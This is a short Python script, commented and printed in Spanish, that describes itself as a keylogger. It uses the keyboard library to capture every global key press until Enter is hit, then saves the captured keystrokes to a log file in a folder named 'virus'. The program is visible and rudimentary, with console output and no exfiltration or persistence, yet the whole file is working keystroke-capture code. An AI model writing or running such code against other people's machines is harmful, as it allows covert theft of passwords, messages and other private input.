import keyboard
teclas = []
log_file = "log.txt"

def registrar(evento):
    tecla = evento

    if tecla == 'space':
        tecla_registrada = " "
    elif tecla == "enter": 
        tecla_registrada = "\n[ENTER]\n"
    elif len(tecla)>1:
        tecla_registrada = f"[{tecla.upper()}]"
    else:
        tecla_registrada = tecla

    teclas.append(tecla_registrada)

    print(f"numero de teclas ({len(teclas)}): {tecla_registrada.strip()}")

print(f"keylogger iniciado. presione enter")

keyboard.on_press(lambda e: registrar(e.name))
keyboard.wait('enter') 

registro_completo = "".join(teclas)
with open (r"C:\Users\Home\Documents\virus\log.txt", "w") as f:
    f.write(registro_completo)

print("registro completo:", "".join(teclas))
